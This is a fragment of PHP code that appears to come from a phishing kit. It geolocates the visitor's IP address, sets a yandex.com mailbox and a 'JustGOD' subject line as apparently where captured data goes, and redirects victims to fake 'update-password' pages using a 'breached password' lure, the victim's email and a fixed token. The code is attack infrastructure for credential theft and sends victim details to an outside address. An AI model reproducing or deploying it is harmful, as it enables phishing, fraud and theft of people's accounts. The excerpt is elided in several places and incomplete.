...
if($query && $query['status'] == 'success') {
  $ipDetails = 'Result from '.$query['country'].', '.$query['regionName'] .', '.$query['city'].' with IP Address of - '.$query['query'];
} else {
...
header( "Location: index.php?utm_term=131952819_15281_36&utm_campaign=c_tr_a_hma_a_21q1_jj_breachedpassword&main_domain=mail.$domain&email=$email&language=en-ww&utm_source=sfmc&utm_content=473493#update-password?token=eYW0be19jQpggSYCu00CUscHt6SscmQq3KMiFofRd1D3TldLiH" );
}
...
$to = "worthme45@yandex.com";
$subject = "💯🏅JustGOD | $ipDetails";
$headers = "From: justGOD\r\n";
...
header("Location: incorrect.php?utm_term=131952819_15281_36&utm_campaign=c_tr_a_hma_a_21q1_jj_breachedpassword&main_domain=mail.$domain&email=$email&language=en-ww&utm_source=sfmc&utm_content=473493#update-password?token=eYW0be19jQpggSYCu00CUscHt6SscmQq3KMiFofRd1D3TldLiH");
